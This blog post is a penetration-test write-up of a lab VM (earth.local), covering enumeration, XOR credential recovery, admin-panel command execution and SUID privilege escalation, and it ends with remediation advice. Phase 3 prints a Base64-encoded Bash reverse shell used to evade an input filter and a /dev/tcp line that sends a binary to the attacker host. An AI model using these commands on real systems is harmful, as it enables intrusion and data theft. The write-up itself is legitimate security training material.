---
layout: single
title: "Penetration Test Writeup: Hackademia Research Labs"
date: 2026-03-26
categories: [Pentesting]
tags: [kali-linux, nmap, nessus, nikto, dirb, xor, reverse-shell, privilege-escalation, CVE-2023-48795]
author_profile: true
---

## Overview

This post documents a black-box penetration test conducted on a system proposed for integration into Hackademia Research Labs' web server environment. The assessment simulated an external attacker with no prior knowledge of the system's architecture or credentials, following a structured five-phase methodology aligned with **NIST SP 800-115**.

The test resulted in full system compromise and root-level access. Hackademia Research Labs was assigned an **overall risk rating of High**.

---

## Phase 1 — Target Identification & Service Enumeration

Initial reconnaissance identified an active host on the local subnet:

```bash
sudo nmap -sn 192.168.56.0/24
```

The scan identified a live system at `192.168.56.105` with domain names `earth.local` and `terratest.earth.local`.

A full TCP port scan was then conducted:

```bash
sudo nmap -p- -O -sV -Pn 192.168.56.105
```

Three open ports were identified:

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.6 (protocol 2.0) |
| 80 | HTTP | Apache httpd 2.4.51 |
| 443 | SSL/HTTP | Apache httpd 2.4.51 |

---

## Phase 2 — Vulnerability Identification

An Nmap vulnerability script scan was run, followed by a **Nessus Basic Network Scan**, which identified six vulnerabilities including one critical finding:

- **Critical:** Unsupported Python version (no longer receiving security patches)
- **Medium:** SSL certificate trust issues, self-signed certificate, HTTP TRACE/TRACK methods enabled
- **Medium:** SSH prefix truncation vulnerability — **CVE-2023-48795** (Terrapin attack), which may allow a man-in-the-middle attacker to manipulate encrypted SSH traffic during the handshake

---

## Phase 3 — Exploitation & Flag Capture

### Web Application Enumeration

Both domain names were added to `/etc/hosts` to enable local resolution. Browsing to `http://earth.local` revealed an **"Earth Secure Messaging Service"** — a web application with a message input field and an encryption key field.

DIRB was used to enumerate the web server:

```bash
dirb http://earth.local
```

This revealed an `/admin` directory containing an **Admin Command Tool** with a login page. Without credentials, this was noted for later exploitation.

A **Nikto** scan was also run to identify misconfigurations:

```bash
nikto -h 192.168.56.105
```

This revealed accessible directories including `/icons/`, indicating directory indexing was enabled.

### Information Disclosure — testingnotes.txt

Enumerating the HTTPS virtual host `https://terratest.earth.local` revealed a `robots.txt` file referencing `/testingnotes.*`. Accessing `testingnotes.txt` exposed internal development notes in plaintext, including:

- Confirmation that the application uses **XOR encryption**
- Reference to `testdata.txt` used for testing  
- The admin username: **terra**

### XOR Decryption — Credential Recovery

The contents of `testdata.txt` were analysed using **CyberChef** — converted from hex and XOR decoded — revealing the repeated string:

```
earthclimatechangebad4humans
```

This was tested as a password alongside the username `terra` in the admin portal — **authentication was successful**.

### Authenticated Command Execution

The Admin Command Tool accepted arbitrary CLI input. Testing confirmed that system commands were executed directly on the underlying server — running `ls` returned directory listings.

This was used to navigate to `/var/earth_web/` where `user_flag.txt` was found and read, confirming retrieval of the **first flag**.

### Reverse Shell

SSH authentication using the recovered credentials failed, so the admin command interface was used to establish a reverse shell. An initial Bash payload was blocked by application filtering. To bypass this, the payload was **Base64-encoded**:

```bash
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwNC80NDQ0IDA+JjEK' | base64 -d | bash
```

This bypassed the filter and established a reverse shell connection to a Netcat listener. The shell was upgraded to a fully interactive TTY using Python's pty module.

### Privilege Escalation — Misconfigured SUID Binary

SUID binaries were enumerated across the filesystem:

```bash
find / -perm -u=s -type f 2>/dev/null
```

This identified `/usr/bin/reset_root` — an unusual binary not present on a standard system. Initial execution failed, indicating trigger conditions were not met.

The binary was transferred to the attacking machine via Netcat for analysis:

```bash
cat /usr/bin/reset_root > /dev/tcp/192.168.56.104/3333
```

**ltrace** analysis revealed that the binary checked for the existence of specific files before executing. The required trigger files were created using the `touch` command. On re-execution, the binary **reset the root password to "Earth"**.

Using `su root` with this password granted full **root-level access**.

### root_flag.txt

Navigating to `/root/` revealed `root_flag.txt`, confirming capture of the **second and final flag** — full system compromise was achieved.

---

## Vulnerability Summary

| Vulnerability | Impact | Likelihood | Overall Risk |
|---|---|---|---|
| Credential Disclosure via Development Notes | High | High | Critical |
| Web-Based Command Execution (Admin Interface) | High | High | Critical |
| Privilege Escalation via SUID Binary (reset_root) | High | High | Critical |
| Information Disclosure via Public Dev Files | High | High | High |
| Weak XOR Cryptographic Implementation | Medium | High | High |
| Unsupported Python Version | High | Medium | High |
| Self-Signed SSL Certificate | Medium | Medium | Medium |
| HTTP TRACE/TRACK Enabled | Medium | Low | Low |
| SSH Prefix Truncation (CVE-2023-48795) | Medium | Low | Low |

---

## Recommendations

**Critical Priority**
- Remove the `reset_root` SUID binary or restrict its execution immediately
- Disable or tightly restrict the web-based admin command interface
- Remove all development artefacts from publicly accessible directories

**High Priority**
- Replace the custom XOR encryption with industry-standard cryptographic methods (e.g. AES)
- Enforce strong password policies and ensure credentials are not exposed in application files

**Medium Priority**
- Replace the self-signed SSL/TLS certificate with one from a trusted Certificate Authority
- Disable HTTP TRACE and TRACK methods in Apache configuration
- Replace password-based SSH authentication with key-based authentication

---

## Conclusions

This assessment demonstrated that the proposed deployment environment for Hackademia Research Labs is vulnerable to full compromise by an unauthenticated external attacker. Initial access was gained through information disclosure and weak application design. Privilege escalation was achieved via a misconfigured SUID binary, resulting in root-level access and retrieval of both flags.

It is **not recommended** to proceed with deployment until all identified vulnerabilities are addressed. The overall risk rating is **High**.